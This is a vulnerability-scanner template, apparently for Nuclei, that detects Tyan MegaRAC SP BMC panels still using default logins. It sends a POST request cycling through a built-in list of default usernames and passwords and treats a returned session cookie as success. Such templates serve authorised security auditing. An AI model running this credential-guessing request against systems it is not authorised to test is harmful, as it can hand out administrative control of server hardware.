id: tyan-megarac-sp-default-login
info:
  author: c-sh0
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: Tyan Megarac SP Default Login
  name: Tyan Megarac SP Default Login
  reference:
  - ftp://ftp.tyan.com/doc/AST2500_UG_v1.0b.pdf
  - https://blog.mpecsinc.com/2020/03/30/tyan-rmm-tips-default-username-and-password-plus-set-up-tips/
  severity: high
  tags: default-login,panel,bmc,tyan
requests:
- attack: clusterbomb
  cookie-reuse: true
  matchers:
  - status:
    - 200
    type: status
  - part: body
    regex:
    - '''SESSION_COOKIE''(\s+):(\s+)''([A-Za-z0-9]+)'''
    type: regex
  matchers-condition: and
  payloads:
    password:
    - admin
    - ADMIN
    - superuser
    - PASSW0RD
    username:
    - admin
    - sysadmin
    - ADMIN
    - root
    - USERID
  raw:
  - 'POST /rpc/WEBSES/create.asp HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/95.0.4638.69 Safari/537.36

    Content-Type: application/x-www-form-urlencoded


    WEBVAR_USERNAME={{username}}&WEBVAR_PASSWORD={{password}}

    '
  redirects: false
  stop-at-first-match: true
